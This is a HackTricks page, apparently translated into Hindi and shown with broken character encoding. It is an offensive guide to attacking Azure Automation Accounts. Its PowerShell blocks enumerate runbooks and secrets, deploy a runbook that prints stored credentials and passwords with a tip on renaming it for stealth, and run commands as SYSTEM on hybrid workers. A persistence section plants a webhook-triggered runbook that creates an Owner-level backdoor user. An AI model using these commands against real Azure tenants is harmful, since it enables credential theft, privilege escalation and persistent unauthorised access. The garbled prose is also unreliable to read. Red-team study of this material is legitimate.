# Az - рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

Azure Automation рдПрдХ рдХреНрд▓рд╛рдЙрдб-рдЖрдзрд╛рд░рд┐рдд рдСрдЯреЛрдореЗрд╢рди, рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЕрдкрдбреЗрдЯреНрд╕, рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ Azure рдФрд░ рдЧреИрд░-Azure рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рд╕реБрд╕рдВрдЧрдд рдкреНрд░рдмрдВрдзрди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдкреНрд░реЛрд╕реЗрд╕ рдСрдЯреЛрдореЗрд╢рди, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди, рдЕрдкрдбреЗрдЯ рдкреНрд░рдмрдВрдзрди, рд╕рд╛рдЭрд╛ рдХреНрд╖рдорддрд╛рдПрдВ, рдФрд░ рд╡рд┐рд╡рд┐рдз рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдпреЗ Azure рдореЗрдВ "**рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп**" рдХреА рддрд░рд╣ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ **Azure рд╡рд╛рддрд╛рд╡рд░рдг** рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд, рдЬрд╛рдВрдЪ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪреАрдЬреЛрдВ (рдХреНрд░рд┐рдпрд╛рдУрдВ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕) рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рджреЗрддреЗ рд╣реИрдВред

### рд░рди рдРрдЬ рдЕрдХрд╛рдЙрдВрдЯ

рдЬрдм **рд░рди рдРрдЬ рдЕрдХрд╛рдЙрдВрдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ Azure AD **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЛ рд╕реЗрд▓реНрдл-рд╕рд╛рдЗрдиреНрдб рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд╕рд╛рде рдмрдирд╛рддрд╛ рд╣реИ, рдПрдХ **рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ **рд╡рд░реНрддрдорд╛рди рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди** рдореЗрдВ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд▓рд┐рдП **рдХрдВрдЯреНрд░реАрдмреНрдпреВрдЯрд░** рднреВрдорд┐рдХрд╛ рдЕрд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ (рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░)ред\
Microsoft рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд▓рд┐рдП **рдореИрдиреЗрдЬреНрдб рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

{% hint style="warning" %}
рдпрд╣ **30 рд╕рд┐рддрдВрдмрд░, 2023 рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдореИрдиреЗрдЬреНрдб рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреАрдЬ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**
{% endhint %}

## рд░рдирдмреБрдХреНрд╕ рдФрд░ рдЬреЙрдмреНрд╕ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛

**рд░рдирдмреБрдХреНрд╕** рдЖрдкрдХреЛ **рдордирдорд╛рдиреЗ PowerShell** рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рджреЗрддреА рд╣реИрдВред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рд╕рдВрд▓рдЧреНрди рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЪреБрд░рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ)ред\
**рд░рдирдмреБрдХреНрд╕** рдХреЗ **рдХреЛрдб** рдореЗрдВ рдЖрдкрдХреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** (рдЬреИрд╕реЗ рдХреНрд░реЗрдбреНрд╕) рднреА рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

рдпрджрд┐ рдЖрдк **рдЬреЙрдмреНрд╕** рдХреЛ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдРрд╕рд╛ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **рдЖрдЙрдЯрдкреБрдЯ** рдХреЛ **рд╕рдорд╛рд╣рд┐рдд** рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рд░рди рдХрд╛ рд╣реЛрддрд╛ рд╣реИ (рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА**).

рдЬрд╛рдПрдВ `Automation Accounts` --> `<Select Automation Account>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░

рдПрдХ рд░рдирдмреБрдХ рдХреЛ Azure рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдХрдВрдЯреЗрдирд░** рдореЗрдВ рдпрд╛ рдПрдХ **рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░** рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**рд▓реЙрдЧ рдПрдирд╛рд▓рд┐рдЯрд┐рдХреНрд╕ рдПрдЬреЗрдВрдЯ** рдХреЛ VM рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░ рдЬреЙрдмреНрд╕ Windows рдкрд░ **SYSTEM** рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ Linux рдкрд░ **nxautomation** рдЕрдХрд╛рдЙрдВрдЯ рдкрд░ рдЪрд▓рддреЗ рд╣реИрдВред\
рдкреНрд░рддреНрдпреЗрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░ рдХреЛ рдПрдХ **рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░ рдЧреНрд░реБрдк** рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **рд░рдирдмреБрдХ** рдХреЛ рдПрдХ **Windows рд╣рд╛рдЗрдмреНрд░рд┐рдб рд╡рд░реНрдХрд░** рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ **System** рдХреЗ рд░реВрдк рдореЗрдВ **рдордирдорд╛рдиреЗ рдХрдорд╛рдВрдбреНрд╕** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВрдЧреЗред

## рд╕реНрдЯреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (SC) рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛

Azure Automation **рд╕реНрдЯреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдПрдХ Azure рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЙрдб рдпрд╛ рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕реЗрд╕ рдбреЗрдЯрд╛рд╕реЗрдВрдЯрд░ рдореЗрдВ рдиреЛрдбреНрд╕ рдХреЗ рд▓рд┐рдП PowerShell Desired State Configuration (DSC) [рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдиреНрд╕](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) рд▓рд┐рдЦрдиреЗ, рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ, рдФрд░ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рд╕реЗрд╡рд╛ [DSC рд░рд┐рд╕реЛрд░реНрд╕реЗрдЬ](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) рдХреЛ рднреА рдЖрдпрд╛рдд рдХрд░рддреА рд╣реИ, рдФрд░ рд▓рдХреНрд╖реНрдп рдиреЛрдбреНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдиреНрд╕ рдЕрд╕рд╛рдЗрди рдХрд░рддреА рд╣реИ, рд╕рднреА рдХреНрд▓рд╛рдЙрдб рдореЗрдВред рдЖрдк Azure рдкреЛрд░реНрдЯрд▓ рдореЗрдВ Azure Automation рд╕реНрдЯреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ **рд╕реНрдЯреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (DSC)** рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди** рдХреЗ рддрд╣рддред

рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдиреНрд╕ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### RCE

SC рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдмрдВрдзрд┐рдд рдорд╢реАрдиреЛрдВ рдореЗрдВ рдордирдорд╛рдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## рдЧрдгрдирд╛

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### рд░рдирдмреБрдХ рдмрдирд╛рдПрдВ

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
### рдПрдХ рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдФрд░ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХрд╛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% hint style="info" %}
рдЖрдк рд╡реЗрдм рдХрдВрд╕реЛрд▓ рд╕реЗ рдореМрдЬреВрджрд╛ Run Book рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░рдХреЗ рднреА рдпрд╣реА рдХрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## рд╕реНрдерд╛рдпрд┐рддреНрд╡

### рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рд╡рд╛рд▓рд╛ рдСрдЯреЛрдореЗрд╢рди

* рдПрдХ рдирдпрд╛ Automation Account рдмрдирд╛рдПрдВ
* "Create Azure Run As account": рд╣рд╛рдБ
* рдПрдХ рдирдпрд╛ рд░рдирдмреБрдХ рдЖрдпрд╛рдд рдХрд░реЗрдВ рдЬреЛ AzureAD рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП Owner рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ
* рдЗрд╕ рдмреНрд▓реЙрдЧ рдХреЗ рд▓рд┐рдП рдирдореВрдирд╛ рд░рдирдмреБрдХ рдпрд╣рд╛рдБ рд╕реНрдерд┐рдд рд╣реИ - [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* рд░рдирдмреБрдХ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ
* рд░рдирдмреБрдХ рдХреЗ рд▓рд┐рдП рдПрдХ webhook рдЬреЛрдбрд╝реЗрдВ
* Automation account рдореЗрдВ AzureAD рдореЙрдбреНрдпреВрд▓ рдЬреЛрдбрд╝реЗрдВ
* Azure Automation Modules рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ
* рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ "User Administrator" рдФрд░ "Subscription Owner" рдЕрдзрд┐рдХрд╛рд░ рд╕реМрдВрдкреЗрдВ
* рдЕрдВрддрддрдГ рдЖрдкрдХреА рдкрд╣реБрдБрдЪ рдЦреЛ рджреЗрдВ...
*   рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде webhook рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ

```powershell
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```

## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
